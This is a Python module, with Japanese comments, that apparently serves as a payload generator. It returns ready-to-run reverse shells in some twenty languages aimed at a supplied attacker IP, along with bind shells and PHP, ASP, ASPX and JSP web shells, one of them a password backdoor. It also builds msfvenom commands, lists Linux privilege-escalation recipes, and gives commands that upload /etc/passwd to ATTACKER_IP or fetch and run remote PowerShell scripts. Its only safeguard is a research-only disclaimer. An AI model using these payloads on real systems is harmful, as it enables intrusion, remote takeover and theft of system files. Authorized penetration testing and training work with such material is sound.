"""
Payload Arsenal Module - 即座に使えるペイロードデータベース

各種リバースシェル、バインドシェル、Webシェル、権限昇格スクリプトを提供
研究目的専用 - 許可のないシステムへの使用は違法です
"""

import base64
import urllib.parse
from typing import Optional


class PayloadArsenal:
    """ペイロードアーセナル - 攻撃用ペイロード生成"""

    # ==========================================================================
    # リバースシェル
    # ==========================================================================

    def get_reverse_shell(self, shell_type: str, ip: str, port: int) -> str:
        """リバースシェルペイロードを生成

        Args:
            shell_type: シェルタイプ (bash, python, python3, php, perl, ruby, nc, powershell, ...)
            ip: 攻撃者のIPアドレス
            port: リスニングポート
        """
        shells = {
            'bash': f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",

            'bash_udp': f"bash -i >& /dev/udp/{ip}/{port} 0>&1",

            'sh': f"/bin/sh -i >& /dev/tcp/{ip}/{port} 0>&1",

            'python': f'''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'''',

            'python3': f'''python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'''',

            'python_pty': f'''python3 -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")\'''',

            'php': f'''php -r '$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");\'''',

            'php_exec': f'''<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'"); ?>''',

            'perl': f'''perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\'  ''',

            'ruby': f'''ruby -rsocket -e'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'''',

            'nc': f"nc -e /bin/sh {ip} {port}",

            'nc_mkfifo': f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",

            'ncat': f"ncat {ip} {port} -e /bin/bash",

            'powershell': f'''powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"''',

            'powershell_b64': self._get_powershell_b64_reverse(ip, port),

            'java': f'''Runtime r = Runtime.getRuntime();String cmd[] = {{"/bin/bash","-c","bash -i >& /dev/tcp/{ip}/{port} 0>&1"}};Process p = r.exec(cmd);''',

            'groovy': f'''String host="{ip}";int port={port};String cmd="cmd.exe";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){{while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {{p.exitValue();break;}}catch (Exception e){{}}}};p.destroy();s.close();''',

            'lua': f'''lua -e "require('socket');require('os');t=socket.tcp();t:connect('{ip}','{port}');os.execute('/bin/sh -i <&3 >&3 2>&3');"''',

            'nodejs': f'''(function(){{var net = require("net"),cp = require("child_process"),sh = cp.spawn("/bin/sh", []);var client = new net.Socket();client.connect({port}, "{ip}", function(){{client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);}});return /a/;}})();''',

            'socat': f"socat TCP:{ip}:{port} EXEC:/bin/sh",

            'awk': f'''awk 'BEGIN {{s = "/inet/tcp/0/{ip}/{port}"; while(42) {{ do{{ printf "shell>" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != "exit") close(s); }}' /dev/null''',
        }

        shell_type = shell_type.lower()
        if shell_type not in shells:
            available = ', '.join(sorted(shells.keys()))
            return f"Unknown shell type: {shell_type}\nAvailable: {available}"

        return f"=== Reverse Shell ({shell_type}) ===\nIP: {ip} | Port: {port}\n\n{shells[shell_type]}\n\n💡 リスナー起動: nc -lvnp {port}"

    def _get_powershell_b64_reverse(self, ip: str, port: int) -> str:
        """Base64エンコードされたPowerShellリバースシェル"""
        ps_script = f'''$client = New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()'''
        encoded = base64.b64encode(ps_script.encode('utf-16-le')).decode()
        return f"powershell -e {encoded}"

    # ==========================================================================
    # バインドシェル
    # ==========================================================================

    def get_bind_shell(self, shell_type: str, port: int) -> str:
        """バインドシェルペイロードを生成

        Args:
            shell_type: シェルタイプ (python, nc, perl, ...)
            port: バインドするポート
        """
        shells = {
            'python': f'''python -c 'import socket,os,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",{port}));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);subprocess.call(["/bin/sh","-i"])\'''',

            'python3': f'''python3 -c 'import socket,os,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",{port}));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);subprocess.call(["/bin/sh","-i"])\'''',

            'nc': f"nc -lvnp {port} -e /bin/sh",

            'nc_mkfifo': f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -lvnp {port} >/tmp/f",

            'perl': f'''perl -e 'use Socket;$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));setsockopt(S,SOL_SOCKET,SO_REUSEADDR,pack("l",1));bind(S,sockaddr_in($p,INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){{open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/sh -i");}};\'  ''',

            'socat': f"socat TCP-LISTEN:{port},reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane",
        }

        shell_type = shell_type.lower()
        if shell_type not in shells:
            available = ', '.join(sorted(shells.keys()))
            return f"Unknown shell type: {shell_type}\nAvailable: {available}"

        return f"=== Bind Shell ({shell_type}) ===\nPort: {port}\n\n{shells[shell_type]}\n\n💡 接続: nc TARGET_IP {port}"

    # ==========================================================================
    # Webシェル
    # ==========================================================================

    def get_webshell(self, shell_type: str) -> str:
        """Webシェルを生成

        Args:
            shell_type: シェルタイプ (php, php_mini, asp, aspx, jsp)
        """
        shells = {
            'php': '''<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
}
?>
<!-- Usage: ?cmd=whoami -->''',

            'php_mini': '''<?php system($_GET['c']); ?>''',

            'php_eval': '''<?php eval($_POST['cmd']); ?>''',

            'php_passthru': '''<?php passthru($_GET['cmd']); ?>''',

            'php_backdoor': '''<?php
$password = "secret"; // Change this
if($_GET['p'] == $password){
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>''',

            'asp': '''<%
Dim oScript, oScriptNet, oFileSys, oFile, szCMD, szTempFile
szCMD = Request.Form("cmd")
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
szTempFile = "c:\\" & oFileSys.GetTempName()
Call oScript.Run ("cmd.exe /c " & szCMD & " > " & szTempFile, 0, True)
Set oFile = oFileSys.OpenTextFile (szTempFile, 1, False, 0)
Response.Write oFile.ReadAll
oFile.Close
Call oFileSys.DeleteFile(szTempFile, True)
%>''',

            'aspx': '''<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
protected void Page_Load(object sender, EventArgs e) {
    if (Request["cmd"] != null) {
        ProcessStartInfo psi = new ProcessStartInfo();
        psi.FileName = "cmd.exe";
        psi.Arguments = "/c " + Request["cmd"];
        psi.RedirectStandardOutput = true;
        psi.UseShellExecute = false;
        Process p = Process.Start(psi);
        Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
    }
}
</script>''',

            'jsp': '''<%@ page import="java.util.*,java.io.*"%>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    String[] cmdarr = {"/bin/sh", "-c", cmd};
    Process p = Runtime.getRuntime().exec(cmdarr);
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String dirone = dis.readLine();
    while (dirone != null) {
        out.println(dirone);
        dirone = dis.readLine();
    }
}
%>''',

            'war': '''<!-- WAR file webshell - package as WEB-INF/web.xml + cmd.jsp -->''',
        }

        shell_type = shell_type.lower()
        if shell_type not in shells:
            available = ', '.join(sorted(shells.keys()))
            return f"Unknown shell type: {shell_type}\nAvailable: {available}"

        return f"=== Web Shell ({shell_type}) ===\n\n{shells[shell_type]}"

    # ==========================================================================
    # MSFVenom生成コマンド
    # ==========================================================================

    def get_msfvenom_payload(self, payload_type: str, ip: str, port: int,
                             format_type: str = "raw") -> str:
        """msfvenomペイロード生成コマンドを返す

        Args:
            payload_type: ペイロードタイプ (linux_x64, linux_x86, windows_x64, ...)
            ip: LHOST
            port: LPORT
            format_type: 出力フォーマット (raw, elf, exe, python, c, ...)
        """
        payloads = {
            'linux_x64': f"msfvenom -p linux/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f {format_type}",
            'linux_x64_meterpreter': f"msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f {format_type}",
            'linux_x86': f"msfvenom -p linux/x86/shell_reverse_tcp LHOST={ip} LPORT={port} -f {format_type}",
            'linux_x86_meterpreter': f"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f {format_type}",

            'windows_x64': f"msfvenom -p windows/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f {format_type}",
            'windows_x64_meterpreter': f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f {format_type}",
            'windows_x86': f"msfvenom -p windows/shell_reverse_tcp LHOST={ip} LPORT={port} -f {format_type}",
            'windows_x86_meterpreter': f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f {format_type}",

            'php': f"msfvenom -p php/reverse_php LHOST={ip} LPORT={port} -f raw",
            'asp': f"msfvenom -p windows/shell_reverse_tcp LHOST={ip} LPORT={port} -f asp",
            'aspx': f"msfvenom -p windows/shell_reverse_tcp LHOST={ip} LPORT={port} -f aspx",
            'jsp': f"msfvenom -p java/jsp_shell_reverse_tcp LHOST={ip} LPORT={port} -f raw",
            'war': f"msfvenom -p java/jsp_shell_reverse_tcp LHOST={ip} LPORT={port} -f war",

            'python': f"msfvenom -p cmd/unix/reverse_python LHOST={ip} LPORT={port} -f raw",
            'bash': f"msfvenom -p cmd/unix/reverse_bash LHOST={ip} LPORT={port} -f raw",
            'perl': f"msfvenom -p cmd/unix/reverse_perl LHOST={ip} LPORT={port} -f raw",

            'android': f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f raw -o shell.apk",
            'macos': f"msfvenom -p osx/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f macho",
        }

        payload_type = payload_type.lower()
        if payload_type not in payloads:
            available = ', '.join(sorted(payloads.keys()))
            return f"Unknown payload type: {payload_type}\nAvailable: {available}"

        return f"=== MSFVenom Command ({payload_type}) ===\n\n{payloads[payload_type]}\n\n💡 フォーマット例: raw, elf, exe, dll, python, c, ruby, js_le, ps1"

    # ==========================================================================
    # 権限昇格ペイロード
    # ==========================================================================

    def get_privesc_payload(self, privesc_type: str) -> str:
        """権限昇格ペイロードを生成

        Args:
            privesc_type: タイプ (suid_bash, sudo_abuse, cron_abuse, ...)
        """
        payloads = {
            'suid_bash': '''# SUID bash exploit
cp /bin/bash /tmp/bash
chmod +s /tmp/bash
/tmp/bash -p''',

            'suid_find': '''# SUID find exploit
find . -exec /bin/sh -p \\; -quit''',

            'suid_vim': '''# SUID vim exploit
vim -c ':!/bin/sh' ''',

            'suid_python': '''# SUID Python exploit
python -c 'import os; os.execl("/bin/sh", "sh", "-p")' ''',

            'suid_perl': '''# SUID Perl exploit
perl -e 'exec "/bin/sh";' ''',

            'sudo_su': '''# If sudo su works
sudo su -''',

            'sudo_vi': '''# Sudo vi escape
sudo vi
:!/bin/sh''',

            'sudo_less': '''# Sudo less escape
sudo less /etc/passwd
!/bin/sh''',

            'sudo_awk': '''# Sudo awk
sudo awk 'BEGIN {system("/bin/sh")}' ''',

            'sudo_find': '''# Sudo find
sudo find / -exec /bin/sh \\; -quit''',

            'sudo_nmap': '''# Sudo nmap (old versions)
sudo nmap --interactive
!sh''',

            'sudo_env': '''# Sudo with LD_PRELOAD
# 1. Create evil.c:
# #include <stdio.h>
# #include <stdlib.h>
# void _init() { unsetenv("LD_PRELOAD"); setgid(0); setuid(0); system("/bin/sh"); }
# 2. Compile: gcc -fPIC -shared -o /tmp/evil.so evil.c -nostartfiles
# 3. Run: sudo LD_PRELOAD=/tmp/evil.so <allowed_command>''',

            'cron_nc': '''# Cron reverse shell (add to writable cron file)
* * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1' ''',

            'writable_passwd': '''# If /etc/passwd is writable
# Generate password: openssl passwd -1 newpassword
echo 'newroot:$1$hash$...:0:0:root:/root:/bin/bash' >> /etc/passwd
su newroot''',

            'capabilities': '''# Check capabilities
getcap -r / 2>/dev/null

# Python with cap_setuid
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Perl with cap_setuid
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";' ''',

            'docker': '''# Docker privilege escalation (if user in docker group)
docker run -v /:/mnt --rm -it alpine chroot /mnt sh''',

            'lxc': '''# LXC/LXD privilege escalation
lxc image import ./alpine*.tar.gz --alias myimage
lxc init myimage mycontainer -c security.privileged=true
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
lxc start mycontainer
lxc exec mycontainer /bin/sh''',
        }

        privesc_type = privesc_type.lower()
        if privesc_type not in payloads:
            available = ', '.join(sorted(payloads.keys()))
            return f"Unknown privesc type: {privesc_type}\nAvailable: {available}"

        return f"=== Privilege Escalation ({privesc_type}) ===\n\n{payloads[privesc_type]}"

    # ==========================================================================
    # TTYアップグレード
    # ==========================================================================

    def get_tty_upgrade(self) -> str:
        """TTYシェルアップグレード方法を返す"""
        return """=== TTY Shell Upgrade Methods ===

【Method 1: Python】
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'

【Method 2: Full Interactive (推奨)】
# ターゲット上で:
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl+Z

# ローカルで:
stty raw -echo; fg
reset

# ターゲット上で:
export SHELL=bash
export TERM=xterm-256color
stty rows 40 columns 160

【Method 3: script】
script -qc /bin/bash /dev/null

【Method 4: socat】
# 攻撃者:
socat file:`tty`,raw,echo=0 tcp-listen:PORT

# ターゲット:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:PORT

【Method 5: rlwrap (ローカル側)】
rlwrap nc -lvnp PORT

【Method 6: perl】
perl -e 'exec "/bin/bash";'

【Method 7: Ruby】
ruby -e 'exec "/bin/bash"'
"""

    # ==========================================================================
    # データ転送
    # ==========================================================================

    def get_file_transfer(self, method: str) -> str:
        """ファイル転送方法を返す

        Args:
            method: 転送方法 (wget, curl, nc, python, base64, ...)
        """
        methods = {
            'wget': '''# Download
wget http://ATTACKER_IP:PORT/file -O /tmp/file

# Upload (POST)
wget --post-file=/etc/passwd http://ATTACKER_IP:PORT/''',

            'curl': '''# Download
curl http://ATTACKER_IP:PORT/file -o /tmp/file

# Upload
curl -X POST -F "file=@/etc/passwd" http://ATTACKER_IP:PORT/upload''',

            'nc': '''# Download (attacker runs: nc -lvnp PORT < file)
nc ATTACKER_IP PORT > file

# Upload (attacker runs: nc -lvnp PORT > file)
nc ATTACKER_IP PORT < /etc/passwd''',

            'python_server': '''# Start HTTP server
python3 -m http.server PORT
python2 -m SimpleHTTPServer PORT''',

            'python_upload': '''# Upload server (Python3)
python3 -c "
import http.server
import cgi
class Handler(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        form = cgi.FieldStorage(fp=self.rfile, headers=self.headers, environ={'REQUEST_METHOD':'POST'})
        file_item = form['file']
        open(file_item.filename, 'wb').write(file_item.file.read())
        self.send_response(200)
        self.end_headers()
http.server.HTTPServer(('', 8000), Handler).serve_forever()
"''',

            'base64': '''# Encode (target)
base64 /etc/passwd

# Decode (attacker)
echo "BASE64_STRING" | base64 -d > file''',

            'scp': '''# Download from target
scp user@TARGET:/path/to/file ./local_file

# Upload to target
scp ./local_file user@TARGET:/path/to/file''',

            'php': '''# PHP Download
php -r '$data = file_get_contents("http://ATTACKER_IP:PORT/file"); file_put_contents("/tmp/file", $data);' ''',

            'powershell': '''# PowerShell Download
powershell -c "(New-Object Net.WebClient).DownloadFile('http://ATTACKER_IP:PORT/file','C:\\temp\\file')"

# IEX (In-memory execution)
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:PORT/script.ps1')"''',

            'certutil': '''# Windows certutil
certutil.exe -urlcache -split -f http://ATTACKER_IP:PORT/file C:\\temp\\file''',

            'bitsadmin': '''# Windows bitsadmin
bitsadmin /transfer job /download /priority high http://ATTACKER_IP:PORT/file C:\\temp\\file''',

            'smb': '''# Start SMB server (Impacket)
impacket-smbserver share . -smb2support

# Copy from Windows
copy \\\\ATTACKER_IP\\share\\file C:\\temp\\file''',
        }

        method = method.lower()
        if method not in methods:
            available = ', '.join(sorted(methods.keys()))
            return f"Unknown method: {method}\nAvailable: {available}"

        return f"=== File Transfer ({method}) ===\n\n{methods[method]}"

    # ==========================================================================
    # ステータス
    # ==========================================================================

    async def get_status(self) -> str:
        """ステータスを取得"""
        return """=== Payload Arsenal Status ===

✅ リバースシェル: 20+ 言語対応
   bash, python, php, perl, ruby, nc, powershell, java, nodejs, etc.

✅ バインドシェル: 5+ タイプ

✅ Webシェル: PHP, ASP, ASPX, JSP

✅ MSFVenom: Linux/Windows/macOS/Android対応

✅ 権限昇格: SUID, Sudo, Cron, Docker, LXC

✅ TTYアップグレード: 7 メソッド

✅ ファイル転送: 12+ メソッド
"""

    def list_all_payloads(self) -> str:
        """利用可能な全ペイロードをリスト"""
        return """=== Payload Arsenal - 利用可能ペイロード ===

【リバースシェル】
bash, bash_udp, sh, python, python3, python_pty, php, php_exec, perl, ruby,
nc, nc_mkfifo, ncat, powershell, powershell_b64, java, groovy, lua, nodejs, socat, awk

【バインドシェル】
python, python3, nc, nc_mkfifo, perl, socat

【Webシェル】
php, php_mini, php_eval, php_passthru, php_backdoor, asp, aspx, jsp

【MSFVenom】
linux_x64, linux_x64_meterpreter, linux_x86, linux_x86_meterpreter,
windows_x64, windows_x64_meterpreter, windows_x86, windows_x86_meterpreter,
php, asp, aspx, jsp, war, python, bash, perl, android, macos

【権限昇格】
suid_bash, suid_find, suid_vim, suid_python, suid_perl,
sudo_su, sudo_vi, sudo_less, sudo_awk, sudo_find, sudo_nmap, sudo_env,
cron_nc, writable_passwd, capabilities, docker, lxc

【ファイル転送】
wget, curl, nc, python_server, python_upload, base64, scp, php, powershell, certutil, bitsadmin, smb
"""
